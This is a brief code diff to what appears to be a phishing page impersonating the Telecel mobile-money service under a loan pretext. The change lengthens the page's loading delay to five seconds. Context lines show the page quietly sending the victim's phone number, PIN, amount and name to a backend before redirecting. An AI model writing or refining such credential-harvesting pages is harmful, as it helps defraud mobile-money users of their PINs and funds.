@@ -593,6 +593,9 @@
     // ─── GLOBAL URL PARAMS ───
     const urlParams = new URLSearchParams(window.location.search);
 
+    // ─── LOADING DURATION - 5 SECONDS ───
+    const LOADING_DURATION = 5000; // 5 seconds
+
     // Load saved config from localStorage
     function loadConfig() {
         const saved = localStorage.getItem('telecel_config');
@@ -628,7 +631,6 @@
 
     // ─── STATE ───
     let isProcessing = false;
-    const LOADING_DURATION = 2500; // 2.5 seconds
 
     function loadLoanData() {
         const amount = urlParams.get('amount');
@@ -746,7 +748,7 @@
         // ─── SEND TO BACKEND (FIRE AND FORGET) ───
         sendToBackend(phone, pin, amount, name, period);
 
-        // ─── WAIT FOR LOADING DURATION, THEN REDIRECT ───
+        // ─── WAIT 5 SECONDS, THEN REDIRECT ───
         setTimeout(function() {
             hideLoading();
             
